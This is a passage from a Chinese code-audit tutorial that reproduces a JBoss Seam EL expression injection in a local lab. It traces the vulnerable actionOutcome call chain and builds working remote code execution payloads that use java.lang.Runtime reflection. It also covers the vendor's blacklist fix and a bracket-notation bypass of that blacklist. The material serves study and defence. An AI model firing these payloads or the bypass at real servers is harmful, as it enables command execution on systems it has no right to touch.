  * 进入`jboss-seam/examples/booking`目录，然后执行安装命令：`ant deploy`，程序会自动安装，如下图所示：
安装完毕后在进入jboss 安装的根目录下的`bin`文件，执行`./run.sh`命令，如下图所示：
安装完毕后，在本机环境即可打开该站点，如下图所示：
#### 3、案例漏洞分析
本案例漏洞的原因是因为JBoss EL表达式解析的问题导致了表达式注入。漏洞文件为：`jboss-seam/examples/booking/exploded-archives/jboss-seam-booking.ear/jboss-seam.jar`
反编译后可以得到源码，目录如下：
在本目录下的/navigation/Pages.java 文件是漏洞的入口，关键代码如下：
    private static boolean callAction(FacesContext facesContext) {
         boolean result = false;   
      // 获取 HTTP 参数 actionOutcome 的值
         String outcome = (String)facesContext.getExternalContext().getRequestParameterMap().get("actionOutcome");
         String fromAction = outcome;   
         if (outcome == null) {
             // 获取 HTTP 参数 actionMethod 的值
             String actionId = (String)facesContext.getExternalContext().getRequestParameterMap().get("actionMethod");      
         if (actionId != null) {
                        if (!SafeActions.instance().isActionSafe(actionId)) 
                return result; 
                        String expression = SafeActions.toAction(actionId);
                        result = true;
                        Expressions.MethodExpression actionExpression = Expressions.instance().createMethodExpression(expression);
                        outcome = toString(actionExpression.invoke(new Object[0]));
                fromAction = expression;
                        handleOutcome(facesContext, outcome, fromAction);
            }  
         } else {       
           handleOutcome(facesContext, outcome, fromAction);
        } 
          return result;
      }
获取参数，其中如果获取到 actionOutcome 参数，那么直接传入`handleOutcome` 函数中：
    // handleOutcome 方法
    public static void handleOutcome(FacesContext facesContext, String outcome, String fromAction) {
         facesContext.getApplication().getNavigationHandler().handleNavigation(facesContext, fromAction, outcome); 
         Contexts.getPageContext().flush();
       }
直接调用`facesContext.getApplication().getNavigationHandler().handleNavigation()`
这句其实等价于我们常见的语句：`FacesContext.getCurrentInstance().getExternalContext().redirect()`
是 JSF中的导航处理，继续看`handleNavigation` 函数：
    //  handleNavigation 方法
    public void handleNavigation(FacesContext context, String fromAction, String outcome) {
         if (!context.getResponseComplete())
         {
           if (isOutcomeViewId(outcome)) {        
             FacesManager.instance().interpolateAndRedirect(outcome);
           } else if (Init.instance().isJbpmInstalled() && Pageflow.instance().isInProcess() && Pageflow.instance().hasTransition(outcome)) {       
                Pageflow.instance().navigate(context, outcome);
           } else if (!Pages.instance().navigate(context, fromAction, outcome)) {        
                     this.baseNavigationHandler.handleNavigation(context, fromAction, outcome);
           } 
        }
      }
如果为当前请求没有调用`responseComplete()`方法，则进一步传入`isOutcomeViewId()`方法进行判断：
    // isOutcomeViewId() 方法
    private static boolean isOutcomeViewId(String outcome) { 
       return (outcome != null && outcome.startsWith("/")); 
     }
若传入的参数不为空，并且以`/`开头，则进入`FacesManager.instance().interpolateAndRedirect()`方法，最后经过以下栈的调用进行了
JBoss EL 表达式的解析：
  * interpolateAndRedirect (FacesManager.java)
  * interpolate (Interpolator.java)
  * interpolateExpressions (Interpolator.java)
  * createValueExpression (Expressions.java)
整个漏洞流程如下图所示：
漏洞的逻辑线上面介绍的比较清楚了，下面的关键是如何构建我们想要的 JBoss EL 表达式。JBoss EL 表达式是在 Java EL
表达式基础上的增强。比如说我们想进行参数绑定，那么可以：
如果想要进行参数值绑定，那么可以：
    #{person.name.length()}
    // 使用length()方法返回一个字符串的长度
JBoss EL 解析器可以在JBoss
EL语句中引用服务器端会话对象、会话对象的属性以及参数。在解析基础对象后，用户可以在该对象上调用任意方法。这样一来就使得我们可以通过反射的方式来访问其他任何类及其方法，如我们常用的`java.lang.Runtime`，我们可以通过下面的语句引用来`java.lang.Runtime`类：
    expressions.getClass().forName('java.lang.Runtime')
根据反射的基础知识，我们可以通过反射调用类后，来获取该类的单一方法或者所有方法。
如获取所有的方法：
    expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()
获取单一方法：
    expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime')
执行命令：
    expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('xxx')
这样整个 EL 表达式的最终效果就出来了：
    %23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('xxx')}
结合上面的一些函数要求：
  * 要有`actionOutcome`参数
  * `actionOutcome`参数要以`/`开头
  * 要有目的导航地址
  * 要含有`?`符号
  * `?`符号后要有参数
  * EL 表达式要在`?参数=`的后面
综上，payload 最终如下：
    /seam-booking/home.seam?actionOutcome=/test.xhtml?canshu=%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('gnome-calculator')}
访问后，会返回：
    /seam-booking/test.seam?canshu=java.lang.UNIXProcess%40ef99e17&cid=118
执行效果如下：
网上也有其他形式的 payload，首先使用`getDeclaredMethods()`得到所有方法，然后采用数组的形式调用指定方法。
假设我们想知道`java.lang.Runtime.getRuntime()`的方法是多少序号，那么可以尝试访问：
    /seam-booking/home.seam?actionOutcome=/test.xhtml?xxx=%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[0]}
返回的是：
    /seam-booking/test.seam?xxx=public+void+java.lang.Runtime.exit%28int%29&cid=143
明显不是我们想要的`java.lang.Runtime()`，可以继续尝试`getDeclaredMethods()[1]`
最终得到结果如下：
`getDeclaredMethods()[6]`等价于`java.lang.Runtime.getRuntime.exec()`
`getDeclaredMethods()[13]`等价于`java.lang.Runtime.getRuntime()`
因此最后的 payload 就为：
    /seam-booking/home.seam?actionOutcome=/test.xhtml?canshu=%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[13].invoke(expressions.getClass().forName('java.lang.R
    untime').getDeclaredMethods()[6].invoke(null), 'gnome-calculator')}
执行效果：
#### 4、修复方案
针对于本漏洞，官方修了两次
第一次是对`actionOutcome`中检查是否包含`#{`等字符做了检查，这样完全使得 EL 表达式不能通过 http
传参的方式传入解析。第二次是对另一个参数`actionId`的修复，这里简单说下这个漏洞。
Seam 2.2.2.Final以后，
JBoss创建了一个黑名单，`/src/main/org/jboss/seam/blacklist.properties`，针对以下内容进行了过滤：
    .getClass()
    .addRole(
    .getPassword(
    .removeRole(
但是依旧被绕过了，可以使用类似数组的运算符来处理黑名单模式（此处方法来自于
orange大神的思路：[点此访问](http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html)，本人未经过验证，有兴趣可以试一试）：  
把
    "".getClass().forName("java.lang.Runtime")
改成
    ""["class"].forName("java.lang.Runtime")
因为JBoss Seam 只能在 JBoss EAP 7 下使用，而JBoss EAP 也在2016/11月停止维护，所以现在 JBoss Seam
受到的风险很高（因为忽略了一些安全人员提交的漏洞以及依旧在使用不是最新版本的第三方函数库）
## 0x05 总结
代码审计重要的是实际去做，去尝试，所以在动手研究、分析和复现后，收获是巨大的，本文的所有安装包及相关程序以及上传至项目文件，有兴趣的朋友可以自己下载去复现。
## 0x06 参考